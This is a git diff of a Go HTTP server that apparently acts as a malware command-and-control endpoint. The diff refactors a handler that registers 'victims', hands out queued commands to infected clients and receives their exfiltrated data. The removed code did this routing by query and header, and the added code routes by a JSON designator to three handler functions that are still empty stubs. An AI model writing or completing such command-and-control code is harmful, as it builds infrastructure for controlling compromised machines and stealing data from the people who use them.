@@ -4,6 +4,7 @@ import (
 	//"bufio"
 	//"bytes"
 	//"encoding/base64"
+	"strings"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -33,63 +34,35 @@ func proxyHandler(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Println("Message recieved from: ", r.Host)
 
-	queries := r.URL.Query() //check for incoming url queries
-
 	//read the message received to our side (should be none with GET)
 	message, err := io.ReadAll(r.Body)
 	if err != nil {
 		fmt.Println("There was an error: ", err)
 		return
 	}
-
-	hashVal := queries["DoesHashHaveMessages"]
-	//differentiate get vs post and send responses accordingly
-	//GET requests will be of form ?Key=value wherein Key should be DoesHashHaveMessages
-	//and the value is a hash to check to see if it has messages respond true if it does false otherwise
-	//testing information
-	//curl 127.0.0.1:8888?DoesHashHaveMessages="replace me and " char with your hash"
-	if r.Method == http.MethodGet {
-		// Respond to a GET request
-
-		//check to see if hash queried has new messages to read
-
-		printlNDebug(("received GET value::" + hashVal[0]))
-
-		if DoesHashHaveMessages(hashVal[0]) {
-			fmt.Fprintln(w, "true")
-		} else {
-			fmt.Fprintln(w, "false")
-		}
-
-	} else if r.Method == http.MethodPost { //respond to post commands
-
-		incomingHeader := r.Header.Get("IncomingHeader")
-
-		switch incomingHeader {
-		case "NewClient": //just register the new victim in the lookup tree
-			registerNewClient(string(message))
-		case "IncomingSuperCatData": //reading in data here dont need to return
-			HandleIncomingCatData(string(message))
-		case "RequestCommand": //client is requesting its next command return that if possible otherwise send nil
-			if DoesHashHaveMessages(hashVal[0]) {
-				jsonData, err := json.Marshal(HashGetNextCommand(string(message)))
-				if err != nil {
-					fmt.Println("There was an error: ", err)
-					return
-				}
-				fmt.Fprintln(w, string(jsonData))
-			} else {
-				fmt.Fprintln(w, nil)
-
-			}
-
-			//add other cases here
-
-		}
-		println("this is a post request")
+	
+	//messages come in in the form need to separate them out 
+	// "jsonIdentifier{json data}"
+	designator, json, err := SeparateJsonDesignator(string(message))
+	if(err != nil) {
+		println("ERORR encountered could not separate strings correctly")
+		return
 	}
 
-	fmt.Println("Message: ", string(message))
+
+	switch designator {
+	case "victimregister/json":
+		resp := RegisterNewVictim(json)
+		fmt.Fprintf(w, resp)
+	case "requestCommand/json":
+		resp := HandleIncomingRequest(json)
+		fmt.Fprintf(w, resp)
+	case "incomingData/json":
+		resp := HandleIncomingData(json)
+		fmt.Fprintf(w, resp)
+	}
+
+	
 
 }
 
@@ -163,4 +136,17 @@ func HashGetNextCommand(incomingHash string) VictimCommand {
 		}
 	}
 	return VictimCommand{}
+}
+
+
+func RegisterNewVictim(incomingJson string) (toReturn string){
+	return ""
+}
+
+func HandleIncomingRequest(incomingJson string) (toreturn string){
+	return ""
+}
+
+func HandleIncomingData(incomingJson string) (toreturn string){
+	return ""
 }
